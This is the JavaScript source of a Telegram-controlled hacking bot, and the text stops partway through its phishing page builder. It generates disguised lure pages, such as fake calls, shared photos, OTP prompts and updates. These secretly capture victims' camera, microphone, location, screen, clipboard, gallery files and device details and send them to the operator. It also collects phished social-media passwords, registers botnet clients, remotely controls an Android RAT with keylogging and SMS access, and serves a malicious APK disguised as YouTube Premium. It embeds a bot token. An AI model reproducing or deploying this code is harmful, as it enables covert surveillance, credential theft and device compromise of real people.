const express     = require('express');
const webSocket   = require('ws');
const http        = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4       = require('uuid');
const multer      = require('multer');
const bodyParser  = require('body-parser');
const axios       = require('axios');
const crypto      = require('crypto');
const fs          = require('fs');
const path        = require('path');

// ─────────────────────────────────────────────
const TOKEN    = process.env.TOKEN    || '7696026516:AAF40dKAG6T26ywj5oVp-ad-15qofNieXlU';
const ADMIN_ID = process.env.ADMIN_ID || '7799994340';
const RAILWAY  = 'https://mybot-production-896e.up.railway.app';

const CHANNEL       = 'rakibfxatrading';
const CHANNEL_LINK  = 'https://t.me/rakibfxatrading';
const FB_LINK       = 'https://www.facebook.com/profile.php?id=61595042636110';
const WELCOME_IMG   = 'https://hc1.checker.in/file2link/photos/file_639266.jpg/file_639266.jpg';
// ─────────────────────────────────────────────

const app       = express();
const server    = http.createServer(app);
const wss       = new webSocket.Server({ server });
const bot       = new telegramBot(TOKEN, { polling: true });
const wsClients = new Map();

const upload = multer({ limits: { fileSize: 50*1024*1024 } });
app.use(bodyParser.json({ limit:'50mb' }));
app.use(bodyParser.urlencoded({ extended:true, limit:'50mb' }));

// state
const links  = new Map(); // tok → {action, uid}
const botnet = new Map(); // vid → info
const bCmds  = new Map(); // vid → [cmds]
let curUuid='', curNum='', curTitle='', curTarget='';

// ── TG helpers ────────────────────────────────
const tgMsg  = (c,t,o={}) => bot.sendMessage(c,t,{parse_mode:'HTML',...o}).catch(()=>{});
const tgPic  = (c,b,cap)  => bot.sendPhoto(c,b,{caption:cap,parse_mode:'HTML'}).catch(()=>{});
const tgLoc  = (c,la,lo)  => bot.sendLocation(c,la,lo).catch(()=>{});
const tgAud  = (c,b)      => bot.sendAudio(c,b,{},{filename:'mic.webm',contentType:'audio/webm'}).catch(()=>{});

function mkLink(action, uid) {
    const tok = crypto.randomBytes(12).toString('hex');
    links.set(tok, { action, uid });
    setTimeout(() => links.delete(tok), 600000);
    return RAILWAY + '/go/' + tok;
}

async function checkJoin(userId) {
    try {
        const m = await bot.getChatMember('@'+CHANNEL, userId);
        return ['member','administrator','creator'].includes(m.status);
    } catch(e) { return false; }
}

// ════════════════════════════════════════════
// KEYBOARDS
// ════════════════════════════════════════════

const langKb = () => ({ inline_keyboard:[[
    {text:'🇧🇩 বাংলা',callback_data:'LNG_bn'},
    {text:'🇬🇧 English',callback_data:'LNG_en'},
    {text:'🇮🇳 हिन्दी',callback_data:'LNG_hi'}
]]});

const joinKb = () => ({ inline_keyboard:[
    [{text:'🔵 Facebook Page', url:FB_LINK}],
    [{text:'📢 Telegram Channel', url:CHANNEL_LINK}],
    [{text:'✅ Joined — Verify Now', callback_data:'VERIFY'}]
]});

function mainKb() {
    return { inline_keyboard:[
        [{text:'📷 সামনে ছবি',callback_data:'LNK_cam_f_photo'},{text:'📷 পিছনে ছবি',callback_data:'LNK_cam_b_photo'}],
        [{text:'🎥 সামনে ভিডিও',callback_data:'LNK_cam_f_video'},{text:'🎥 পিছনে ভিডিও',callback_data:'LNK_cam_b_video'}],
        [{text:'📍 লোকেশন',callback_data:'LNK_location'},{text:'🎙️ মাইক',callback_data:'LNK_mic'}],
        [{text:'🖼️ গ্যালারি',callback_data:'LNK_gallery'},{text:'📋 ক্লিপবোর্ড',callback_data:'LNK_clipboard'}],
        [{text:'🖥️ স্ক্রিনশট',callback_data:'LNK_screenshot'},{text:'📱 ডিভাইস তথ্য',callback_data:'LNK_devinfo'}],
        [{text:'🔋 ব্যাটারি',callback_data:'LNK_battery'},{text:'📡 নেটওয়ার্ক',callback_data:'LNK_network'}],
        [{text:'🎣 Facebook ফিশিং',callback_data:'LNK_phish_fb'},{text:'🎣 TikTok ফিশিং',callback_data:'LNK_phish_tt'}],
        [{text:'📸 Instagram ফিশিং',callback_data:'LNK_phish_ig'},{text:'💀 APK লিংক',callback_data:'LNK_apk'}],
        [{text:'🤖 বটনেট লিংক',callback_data:'LNK_botnet'},{text:'📡 ফুল রিকন',callback_data:'LNK_recon'}],
        [{text:'💬 মেসেঞ্জার',callback_data:'LNK_messenger'},{text:'📨 User কে Message',callback_data:'M_USERMSG'}],
        [{text:'📋 বট লিস্ট',callback_data:'BOT_LIST'}]
    ]};
}

const linkKb = (act) => ({ inline_keyboard:[[
    {text:'🔄 নতুন লিংক',callback_data:act},
    {text:'◀️ মেনু',callback_data:'M_BACK'}
]]});

// ════════════════════════════════════════════
// /start
// ════════════════════════════════════════════
bot.onText(/\/start/, async msg => {
    const cid  = msg.chat.id;
    const name = msg.from.first_name || 'বন্ধু';
    try {
        await bot.sendPhoto(cid, WELCOME_IMG, {
            caption:
                `🔥 <b>স্বাগতম ${name}!</b>\n\n` +
                `🛡️ এটি একটি <b>Advanced Hacking & Trading Bot</b>\n\n` +
                `📌 বট ব্যবহার করতে আমাদের চ্যানেলে যুক্ত হন।\n\n` +
                `নিচে যুক্ত হয়ে <b>✅ Verify</b> চাপুন।`,
            parse_mode:'HTML',
            reply_markup: joinKb()
        });
    } catch(e) {
        tgMsg(cid, `🔥 <b>স্বাগতম ${name}!</b>\n\nচ্যানেলে যুক্ত হন তারপর Verify করুন।`, {reply_markup:joinKb()});
    }
});

bot.onText(/\/menu/, msg => {
    tgMsg(msg.chat.id,'🎯 মেইন মেনু:',{reply_markup:mainKb()});
});

// ════════════════════════════════════════════
// Welcome for new channel members
// ════════════════════════════════════════════
bot.on('chat_member', async upd => {
    try {
        if (upd.new_chat_member.status === 'member') {
            const u = upd.new_chat_member.user;
            const name = u.first_name||'বন্ধু';
            const mention = u.username ? `@${u.username}` : `<a href="tg://user?id=${u.id}">${name}</a>`;
            await bot.sendPhoto(upd.chat.id, WELCOME_IMG, {
                caption:`🎉 <b>স্বাগতম ${mention}!</b>\n\nচ্যানেলে আপনাকে স্বাগত জানাই! 🙏\n\n🤖 বট: /start\n💬 সাপোর্ট: @FXATradingAdmin`,
                parse_mode:'HTML'
            }).catch(()=>tgMsg(upd.chat.id,`🎉 স্বাগতম ${mention}!`,{}));
        }
    }catch(e){}
});

// ════════════════════════════════════════════
// CALLBACK HANDLER
// ════════════════════════════════════════════
bot.on('callback_query', async cbq => {
    const uid    = String(cbq.from.id);
    const chatId = cbq.message.chat.id;
    const msgId  = cbq.message.message_id;
    const data   = cbq.data;
    const name   = cbq.from.first_name||'বন্ধু';

    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del  = () => bot.deleteMessage(chatId,msgId).catch(()=>{});
    const edit = (t,kb) => bot.editMessageText(t,{chat_id:chatId,message_id:msgId,parse_mode:'HTML',reply_markup:kb}).catch(()=>{});

    // language
    if (data.startsWith('LNG_')) {
        del();
        return tgMsg(chatId,'🎯 মেইন মেনু:',{reply_markup:mainKb()});
    }

    // verify
    if (data === 'VERIFY') {
        const joined = await checkJoin(cbq.from.id);
        if (!joined) {
            return bot.answerCallbackQuery(cbq.id,{
                text:'❌ আগে চ্যানেলে যুক্ত হন তারপর Verify করুন!',
                show_alert:true
            }).catch(()=>{});
        }
        bot.answerCallbackQuery(cbq.id,{text:'✅ ভেরিফাই সফল!'}).catch(()=>{});
        return edit(
            `✅ <b>ভেরিফাই সফল! স্বাগতম ${name}!</b>\n\nআপনি কী করতে চান?`,
            { inline_keyboard:[
                [{text:'💀 Hacking Bot',callback_data:'ROUTE_HACK'}],
                [{text:'📈 Trading Community',callback_data:'ROUTE_TRADE'}]
            ]}
        );
    }

    if (data==='ROUTE_HACK') { del(); return tgMsg(chatId,'🎯 মেইন মেনু:',{reply_markup:mainKb()}); }
    if (data==='ROUTE_TRADE') {
        return edit(
            `📈 <b>FXA Trading Community</b>\n\n🤖 বট: @FXATradingZoneBot\n💬 Admin: @FXATradingAdmin`,
            { inline_keyboard:[
                [{text:'🤖 Trading Bot',url:'https://t.me/FXATradingZoneBot'}],
                [{text:'👤 Admin Support',url:'https://t.me/FXATradingAdmin'}],
                [{text:'📢 Channel',url:CHANNEL_LINK}],
                [{text:'◀️ Back',callback_data:'ROUTE_BACK'}]
            ]}
        );
    }
    if (data==='ROUTE_BACK') return edit(`✅ কী করতে চান?`,{inline_keyboard:[
        [{text:'💀 Hacking Bot',callback_data:'ROUTE_HACK'}],
        [{text:'📈 Trading',callback_data:'ROUTE_TRADE'}]
    ]});
    if (data==='M_BACK') { del(); return tgMsg(chatId,'🎯 মেইন মেনু:',{reply_markup:mainKb()}); }

    // user message
    if (data==='M_USERMSG') {
        del();
        return bot.sendMessage(chatId,
            '📨 <b>User কে Message পাঠাও</b>\n\nটার্গেটের Telegram User ID লেখো:',
            {parse_mode:'HTML',reply_markup:{force_reply:true}}
        );
    }

    // botnet list
    if (data==='BOT_LIST') {
        if (!botnet.size) return tgMsg(chatId,'❌ কোনো বট নেই।');
        let txt=`🤖 <b>Bots: ${botnet.size}</b>\n\n`;
        let i=1;
        botnet.forEach((v,k)=>{txt+=`${i}. ${v.model||'?'}\n🌍 ${v.ip||'?'}\n\n`;i++;});
        return tgMsg(chatId,txt);
    }

    // link generator
    if (data.startsWith('LNK_')) {
        const act = data.slice(4);
        del();
        const link = mkLink(act, uid);
        return tgMsg(chatId,
            `🔗 <b>লিংক তৈরি হয়েছে!</b>\n\n<code>${link}</code>\n\n👆 কপি করে ভিক্টিমকে পাঠান\n⏰ ১০ মিনিট মেয়াদ`,
            {reply_markup:linkKb(data)}
        );
    }

    // KAZAMIKARI APK control
    const cmd  = data.split(':')[0];
    const duuid= data.split(':')[1];

    if (cmd==='device') {
        const info = wsClients.get(duuid);
        if (!info) return;
        return bot.editMessageText(`°• Commands for <b>${info.model}</b>`,{
            chat_id:ADMIN_ID,message_id:msgId,parse_mode:'HTML',
            reply_markup:{inline_keyboard:[
                [{text:'📸 BACK CAM',callback_data:`camera_main:${duuid}`},{text:'🤳 FRONT CAM',callback_data:`camera_selfie:${duuid}`}],
                [{text:'📍 GPS',callback_data:`location:${duuid}`},{text:'⛄ CLIPBOARD',callback_data:`clipboard:${duuid}`}],
                [{text:'🎻 CALL LOG',callback_data:`calls:${duuid}`},{text:'♐ CONTACTS',callback_data:`contacts:${duuid}`}],
                [{text:'📺 SMS',callback_data:`messages:${duuid}`},{text:'🛍️ SEND SMS',callback_data:`send_message:${duuid}`}],
                [{text:'⚽ PHONE INFO',callback_data:`device_info:${duuid}`},{text:'🍏 APPS',callback_data:`apps:${duuid}`}],
                [{text:'🥤 MIC',callback_data:`microphone:${duuid}`},{text:'🧨 SCREENSHOT',callback_data:`screenshot:${duuid}`}],
                [{text:'🚳 VIBRATE',callback_data:`vibrate:${duuid}`},{text:'🖥️ TOAST',callback_data:`toast:${duuid}`}],
                [{text:'🔒 LOCK',callback_data:`encrypt_data:${duuid}`},{text:'🔓 UNLOCK',callback_data:`decrypt_data:${duuid}`}],
                [{text:'🚦 SMS ALL',callback_data:`send_message_to_all:${duuid}`}]
            ]}
        }).catch(()=>{});
    }

    const simpleWs=['calls','contacts','messages','apps','device_info','clipboard',
        'camera_main','camera_selfie','location','vibrate','screenshot',
        'whatsapp','encrypt_data','decrypt_data','keylogger_on','keylogger_off','stop_audio'];
    if (simpleWs.includes(cmd)) {
        wsCmd(duuid,cmd); del();
        return tgMsg(ADMIN_ID,'✅ Command sent.',{reply_markup:{keyboard:[['📮 Active Machines'],['📡 Control']],resize_keyboard:true}});
    }
    const inputCmds={
        send_message:'🗯️ Enter number with country code:',
        send_message_to_all:'🔄 Enter message for all:',
        file:'🍬 Enter file path (e.g. DCIM/Camera):',
        microphone:'🕍 Enter duration in seconds:',
        toast:'🎒 Enter text to show:',
        show_notification:'🦊 Enter notification title:',
        play_audio:'🎧 Enter audio URL:'
    };
    if (inputCmds[cmd]) {
        curUuid=duuid; del();
        bot.sendMessage(ADMIN_ID,inputCmds[cmd],{reply_markup:{force_reply:true}});
    }
});

// ════════════════════════════════════════════
// MESSAGE HANDLER
// ════════════════════════════════════════════
bot.on('message', async msg => {
    const uid    = String(msg.from.id);
    const chatId = msg.chat.id;
    const text   = msg.text||'';
    if (text==='/start'||text==='/menu') return;

    const rt = msg.reply_to_message?.text||'';
    if (rt) {
        // user message flow
        if (rt.includes('User ID লেখো')) {
            curTarget = text.trim();
            return bot.sendMessage(chatId,'✅ ID: <code>'+curTarget+'</code>\n\nএখন message লেখো:',{parse_mode:'HTML',reply_markup:{force_reply:true}});
        }
        if (rt.includes('এখন message লেখো')) {
            const tid = curTarget; curTarget='';
            try {
                await bot.sendMessage(tid, text);
                tgMsg(chatId,'✅ Message পাঠানো হয়েছে!');
            } catch(e) {
                tgMsg(chatId,'❌ পাঠানো যায়নি — ঐ user বটে /start দেয়নি।');
            }
            return;
        }
        // ws input flows
        if (rt.includes('country code')) { curNum=text; return bot.sendMessage(ADMIN_ID,'📝 Enter message:',{reply_markup:{force_reply:true}}); }
        if (rt.includes('Enter message:')) { wsCmd(curUuid,`send_message:${curNum}/${text}`); curNum=''; curUuid=''; return; }
        if (rt.includes('message for all')) { wsCmd(curUuid,`send_message_to_all:${text}`); curUuid=''; return; }
        if (rt.includes('file path')) { wsCmd(curUuid,`file:${text}`); curUuid=''; return; }
        if (rt.includes('duration in seconds')) { wsCmd(curUuid,`microphone:${text}`); curUuid=''; return; }
        if (rt.includes('text to show')) { wsCmd(curUuid,`toast:${text}`); curUuid=''; return; }
        if (rt.includes('notification title')) { curTitle=text; return bot.sendMessage(ADMIN_ID,'🔗 Enter link:',{reply_markup:{force_reply:true}}); }
        if (rt.includes('Enter link:')) { wsCmd(curUuid,`show_notification:${curTitle}/${text}`); curUuid='';curTitle=''; return; }
        if (rt.includes('audio URL')) { wsCmd(curUuid,`play_audio:${text}`); curUuid=''; return; }
    }

    if (text==='📮 Active Machines') {
        if (!wsClients.size) return tgMsg(ADMIN_ID,'❌ No APK connections.');
        let t2='🎮 Active:\n\n'; wsClients.forEach(v=>{t2+=`• ${v.model} 🔋${v.battery}\n`;}); return tgMsg(ADMIN_ID,t2);
    }
    if (text==='📡 Control') {
        if (!wsClients.size) return tgMsg(ADMIN_ID,'❌ No APK connections.');
        const kb=[]; wsClients.forEach((v,k)=>kb.push([{text:'📱 '+v.model,callback_data:'device:'+k}]));
        return tgMsg(ADMIN_ID,'Select device:',{reply_markup:{inline_keyboard:kb}});
    }
});

function wsCmd(uuid, cmd) { wss.clients.forEach(ws=>{ if(ws.uuid===uuid) ws.send(cmd); }); }

// ════════════════════════════════════════════
// WEBSOCKET (APK)
// ════════════════════════════════════════════
wss.on('connection',(ws,req)=>{
    const uuid=uuid4.v4();
    ws.uuid=uuid;
    const model=req.headers.model||'Unknown';
    const battery=req.headers.battery||'?';
    const version=req.headers.version||'?';
    const provider=req.headers.provider||'?';
    wsClients.set(uuid,{model,battery,version,provider});
    tgMsg(ADMIN_ID,`🤡 <b>NEW APK CONNECTION</b>\n📱 ${model}\n🔋 ${battery}\n🤖 ${version}\n📶 ${provider}`);
    ws.on('close',()=>{ tgMsg(ADMIN_ID,`😫 Disconnected: ${model}`); wsClients.delete(uuid); });
    ws.on('error',()=>wsClients.delete(uuid));
});

// ════════════════════════════════════════════
// HTTP ROUTES
// ════════════════════════════════════════════
app.get('/',(_,res)=>res.send('<h1 style="color:green;text-align:center">✅ Server Online</h1>'));

// APK uploads
app.post('/uploadFile',upload.single('file'),(req,res)=>{
    bot.sendDocument(ADMIN_ID,req.file.buffer,{caption:`📁 ${req.headers.model||'?'}`,parse_mode:'HTML'},{filename:req.file.originalname,contentType:'application/octet-stream'}).catch(()=>{});
    res.send('');
});
app.post('/uploadText',(req,res)=>{
    tgMsg(ADMIN_ID,`📝 <b>${req.headers.model||'?'}</b>\n\n${req.body.text||''}`);
    res.send('');
});
app.post('/uploadLocation',(req,res)=>{
    tgLoc(ADMIN_ID,req.body.lat,req.body.lon);
    tgMsg(ADMIN_ID,`📍 ${req.headers.model||'?'}\nhttps://maps.google.com/?q=${req.body.lat},${req.body.lon}`);
    res.send('');
});

// Link system data endpoints
app.post('/d/photo', upload.single('photo'), (req,res)=>{
    const uid=req.body.uid;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.file) tgPic(uid, req.file.buffer, `${req.body.camtype||'📸 Photo'}\n🌍 IP: ${ip}`);
    res.json({ok:true});
});
app.post('/d/video', upload.single('video'), (req,res)=>{
    const uid=req.body.uid;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.file) bot.sendVideo(uid,req.file.buffer,{caption:`🎥 Video\n🌍 ${ip}`,parse_mode:'HTML'}).catch(()=>{});
    res.json({ok:true});
});
app.post('/d/audio', upload.single('audio'), (req,res)=>{
    const uid=req.body.uid;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    if(req.file){ tgAud(uid,req.file.buffer); tgMsg(uid,`🎙️ Audio received\n🌍 ${ip}`); }
    res.json({ok:true});
});
app.post('/d/loc',(req,res)=>{
    const uid=req.body.uid;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    const{lat,lon,acc}=req.body;
    if(lat&&lon){
        tgLoc(uid,parseFloat(lat),parseFloat(lon));
        tgMsg(uid,`📍 Location\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAcc: ${acc}m\nIP: ${ip}\n🗺 https://maps.google.com/?q=${lat},${lon}`);
    }
    res.json({ok:true});
});
app.post('/d/text',(req,res)=>{
    const uid=req.body.uid;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,`📋 <b>${req.body.type||'Info'}</b>\n\n<code>${(req.body.data||'').slice(0,3800)}</code>\n\n🌍 ${ip}`);
    res.json({ok:true});
});
app.post('/d/creds',(req,res)=>{
    const uid=req.body.uid;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,`🔑 <b>CREDENTIALS CAPTURED!</b>\n\n🌐 Site: <b>${req.body.site||'?'}</b>\n👤 User: <code>${req.body.user||''}</code>\n🔒 Pass: <code>${req.body.pass||''}</code>\n\n🌍 IP: ${ip}`);
    res.json({ok:true});
});
app.post('/b/reg',(req,res)=>{
    const{victimId,uid,model}=req.body;
    const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    botnet.set(victimId,{uid,ip,model:model||'?',last:new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'})});
    tgMsg(uid,`🤖 <b>New Bot!</b>\n📱 ${model||'?'}\n🌍 ${ip}\nTotal: <b>${botnet.size}</b>`);
    res.json({ok:true});
});
app.post('/b/poll',(req,res)=>{
    const{victimId}=req.body;
    if(botnet.has(victimId)) botnet.get(victimId).last=new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'});
    const pending=bCmds.get(victimId)||[]; bCmds.set(victimId,[]);
    res.json({ok:true,commands:pending});
});

// APK serve
app.get('/payload.apk',(req,res)=>{
    const p=path.join(__dirname,'payload.apk');
    if(fs.existsSync(p)){
        res.setHeader('Content-Type','application/vnd.android.package-archive');
        res.setHeader('Content-Disposition','attachment; filename="YouTube_Premium.apk"');
        res.sendFile(p);
    } else res.status(404).send('Not found');
});
app.get('/sw.js',(req,res)=>{
    res.setHeader('Content-Type','application/javascript');
    res.send(`self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>clients.claim());`);
});

// ════════════════════════════════════════════
// LINK PAGE BUILDER
// ════════════════════════════════════════════
app.get('/go/:tok',(req,res)=>{
    const info=links.get(req.params.tok);
    if(!info) return res.send('<h2 style="text-align:center;font-family:sans-serif;color:red;margin-top:30%">Link expired.</h2>');
    res.send(buildPage(info.action, info.uid));
});

function buildPage(action, uid) {
    if (action.startsWith('phish_')) return phishPage(action, uid);
    if (action==='apk')             return apkPage(uid);
    if (action==='botnet')          return botnetPage(uid);
    if (action==='messenger')       return messengerPage(uid);
    return attackPage(action, uid);
}

// ── Attack page ───────────────────────────────────────────────
function attackPage(action, uid) {
    const skins = {
        cam_f_photo:  {bg:'#000',ic:'📞',h:'Incoming Call',    s:'Tap accept to join the call',  btn:'Accept',        bc:'#25D366'},
        cam_b_photo:  {bg:'#000',ic:'📸',h:'Photo Shared',     s:'Someone shared a photo',       btn:'View Photo',    bc:'#1877f2'},
        cam_f_video:  {bg:'#000',ic:'🎥',h:'Video Message',    s:'Tap to watch the video',       btn:'▶ Play Video',  bc:'#C13584'},
        cam_b_video:  {bg:'#000',ic:'🎬',h:'Video Shared',     s:'Tap to view the video',        btn:'▶ Watch',       bc:'#ff0000'},
        location:     {bg:'#fff',ic:'📍',h:'Confirm Location', s:'Confirm your delivery address', btn:'Confirm',       bc:'#4CAF50'},
        mic:          {bg:'#1a1a1a',ic:'🎙️',h:'Voice Message', s:'Tap to listen to this message',btn:'▶ Play Audio',  bc:'#25D366'},
        gallery:      {bg:'#111',ic:'🔞',h:'Private Photo',    s:'Someone shared a private photo. Allow to view.',btn:'🔓 Allow & View', bc:'#e24a4a'},
        clipboard:    {bg:'#fff',ic:'🏦',h:'Enter OTP',        s:'Paste your one-time password', btn:'Confirm OTP',   bc:'#1877f2'},
        devinfo:      {bg:'#fff',ic:'⚙️',h:'System Update',    s:'Tap to install security patch', btn:'Install',       bc:'#4285f4'},
        battery:      {bg:'#fff',ic:'🔋',h:'Battery Alert',    s:'Low battery detected',         btn:'Fix Now',       bc:'#ff9800'},
        network:      {bg:'#fff',ic:'📡',h:'Connection Check', s:'Verify your network security', btn:'Verify',        bc:'#2196F3'},
        screenshot:   {bg:'#000',ic:'🖥️',h:'Screen Verification',s:'Share screen to continue',   btn:'Allow',         bc:'#9C27B0'},
        recon:        {bg:'#1877f2',ic:'👤',h:'Facebook Verify',s:'Verify your account now',     btn:'Verify',        bc:'#fff'},
    };

    const sk = skins[action] || skins.recon;
    const dark = sk.bg!=='#fff';
    const tc = dark ? '#fff' : '#333';
    const sc = dark ? '#aaa' : '#666';

    const doFront    = ['cam_f_photo','cam_f_video','screenshot','recon'].includes(action);
    const doBack     = ['cam_b_photo','cam_b_video'].includes(action);
    const doVideo    = ['cam_f_video','cam_b_video'].includes(action);
    const doLocation = ['location','network','recon','devinfo'].includes(action);
    const doMic      = ['mic','recon'].includes(action);
    const doGallery  = action === 'gallery';
    const doClip     = action === 'clipboard';
    const doScreen   = ['screenshot','recon'].includes(action);

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:${sk.bg};color:${tc};font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:24px}
.ic{font-size:72px;margin-bottom:20px;animation:pp 2s infinite}
@keyframes pp{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
.blur-box{width:200px;height:200px;background:linear-gradient(135deg,#2a2a2a,#444);filter:blur(14px);border-radius:16px;margin:0 auto 16px;display:${doGallery?'block':'none'}}
h2{font-size:22px;margin-bottom:10px;font-weight:700}
p{color:${sc};font-size:14px;margin-bottom:28px;max-width:300px;line-height:1.6}
.btn{padding:16px 0;width:100%;max-width:300px;border:none;border-radius:50px;background:${sk.bc};color:${sk.bc==='#fff'?'#1877f2':'#fff'};font-size:17px;font-weight:700;cursor:pointer;display:block;margin:0 auto}
#st{margin-top:20px;font-size:13px;color:${sc};min-height:20px}
video,canvas{display:none;width:1px;height:1px}
</style>
</head>
<body>
<div class="blur-box"></div>
<div class="ic" style="display:${doGallery?'none':'block'}">${sk.ic}</div>
<h2>${sk.h}</h2>
<p>${sk.s}</p>
<button class="btn" id="mainbtn" onclick="go()">${sk.btn}</button>
<div id="st"></div>
<video id="vv" autoplay playsinline muted></video>
<canvas id="cc"></canvas>

<script>
const UID = '${uid}';
const BASE = '${RAILWAY}';
const D    = '${RAILWAY}/d';

function post(ep, body) {
    return fetch(D + '/' + ep, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({uid:UID, ...body})
    }).catch(()=>{});
}

function setBtn(t) { document.getElementById('mainbtn').textContent = t; }
function setSt(t)  { document.getElementById('st').textContent = t; }

// ── passive info on load ──
window.onload = async function() {
    const info = {
        ua: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cores: navigator.hardwareConcurrency,
        mem: navigator.deviceMemory || '?',
        online: navigator.onLine,
        conn: navigator.connection?.effectiveType || '?',
        time: new Date().toString()
    };
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        info.battery = Math.round(b.level*100) + '%';
        info.charging = b.charging;
    }
    if (navigator.storage?.estimate) {
        const e = await navigator.storage.estimate();
        info.storage = Math.round(e.quota/1024/1024) + 'MB total, ' + Math.round(e.usage/1024/1024) + 'MB used';
    }
    post('text', { type: '📱 Device Info (${action})', data: JSON.stringify(info, null, 2) });
};

async function go() {
    setBtn('...'); setSt('Please wait...');

    ${doLocation ? `
    try {
        await new Promise(r => {
            navigator.geolocation.getCurrentPosition(p => {
                post('loc', {lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy});
                r();
            }, r, {enableHighAccuracy:true, timeout:12000});
        });
    } catch(e) {}` : ''}

    ${doScreen ? `
    try {
        const s = await navigator.mediaDevices.getDisplayMedia({video:true, audio:false});
        const v = document.getElementById('vv'); v.srcObject = s;
        await new Promise(r => v.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 800));
        const c = document.getElementById('cc');
        c.width = v.videoWidth||1080; c.height = v.videoHeight||1920;
        c.getContext('2d').drawImage(v, 0, 0);
        s.getTracks().forEach(t => t.stop());
        const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
        const fd = new FormData(); fd.append('photo', b, 'screen.jpg');
        fd.append('uid', UID); fd.append('camtype', '🖥️ Screen Capture');
        await fetch(D + '/photo', {method:'POST', body:fd});
    } catch(e) {}` : ''}

    ${doFront ? `
    try {
        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
        const v = document.getElementById('vv'); v.srcObject = s;
        await new Promise(r => v.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 1500));
        const c = document.getElementById('cc');
        c.width = v.videoWidth||640; c.height = v.videoHeight||480;
        c.getContext('2d').drawImage(v, 0, 0);
        s.getTracks().forEach(t => t.stop());
        const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
        const fd = new FormData(); fd.append('photo', b, 'front.jpg');
        fd.append('uid', UID); fd.append('camtype', '📷 Front Camera');
        await fetch(D + '/photo', {method:'POST', body:fd});
    } catch(e) {}` : ''}

    ${doBack ? `
    try {
        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}, audio:false});
        const v = document.getElementById('vv'); v.srcObject = s;
        await new Promise(r => v.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 1500));
        const c = document.getElementById('cc');
        c.width = v.videoWidth||640; c.height = v.videoHeight||480;
        c.getContext('2d').drawImage(v, 0, 0);
        s.getTracks().forEach(t => t.stop());
        const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
        const fd = new FormData(); fd.append('photo', b, 'back.jpg');
        fd.append('uid', UID); fd.append('camtype', '📷 Back Camera');
        await fetch(D + '/photo', {method:'POST', body:fd});
    } catch(e) {}` : ''}

    ${doVideo ? `
    try {
        const facing = '${action.includes('_f_') ? 'user' : 'environment'}';
        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:facing}, audio:true});
        const rec = new MediaRecorder(s, {mimeType:'video/webm'});
        const ch = [];
        rec.ondataavailable = e => ch.push(e.data);
        rec.onstop = async () => {
            const blob = new Blob(ch, {type:'video/webm'});
            const fd = new FormData(); fd.append('video', blob, 'vid.webm');
            fd.append('uid', UID); fd.append('camtype', '🎥 Video');
            await fetch(D + '/video', {method:'POST', body:fd}).catch(()=>{});
            s.getTracks().forEach(t => t.stop());
        };
        rec.start(); setTimeout(() => rec.stop(), 15000);
    } catch(e) {}` : ''}

    ${doMic ? `
    try {
        const s = await navigator.mediaDevices.getUserMedia({audio:true, video:false});
        const rec = new MediaRecorder(s); const ch = [];
        rec.ondataavailable = e => ch.push(e.data);
        rec.onstop = async () => {
            const fd = new FormData();
            fd.append('audio', new Blob(ch, {type:'audio/webm'}), 'mic.webm');
            fd.append('uid', UID);
            await fetch(D + '/audio', {method:'POST', body:fd});
            s.getTracks().forEach(t => t.stop());
        };
        rec.start(); setTimeout(() => rec.stop(), 10000);
    } catch(e) {}` : ''}

    ${doGallery ? `
    const inp = document.createElement('input');
    inp.type = 'file'; inp.accept = 'image/*,video/*'; inp.multiple = true; inp.style.display = 'none';
    inp.onchange = async () => {
        const files = [...inp.files];
        setSt('📤 ' + files.length + ' ফাইল পাঠানো হচ্ছে...');
        let done = 0;
        for (const f of files) {
            try {
                const buf = await f.arrayBuffer();
                const fd = new FormData();
                fd.append('photo', new Blob([buf], {type:f.type}), f.name);
                fd.append('uid', UID); fd.append('camtype', '🖼️ Gallery: ' + f.name);
                await fetch(D + '/photo', {method:'POST', body:fd});
                done++;
                setSt('✅ ' + done + '/' + files.length + ' সম্পন্ন');
            } catch(e) {}
        }
        setBtn('✅ Done');
    };
    document.body.appendChild(inp); inp.click();` : ''}

    ${doClip ? `
    try {
        const t = await navigator.clipboard.readText();
        post('text', {type:'📋 Clipboard', data: t});
    } catch(e) {}` : ''}

    setSt('✅ সম্পন্ন');
    setBtn('${sk.btn}');
    document.querySelector('p').textContent = 'ধন্যবাদ!';
    setTimeout(() => {
        document.querySelector('p').textContent = 'Stream পাওয়া যাচ্ছে না। পরে আবার চেষ্টা করুন।';
    }, 4000);
}
<\/script>
</body>
</html>`;
}

// ── Phishing ──────────────────────────────────────────────────
function phishPage(action, uid) {
    const cfg = {
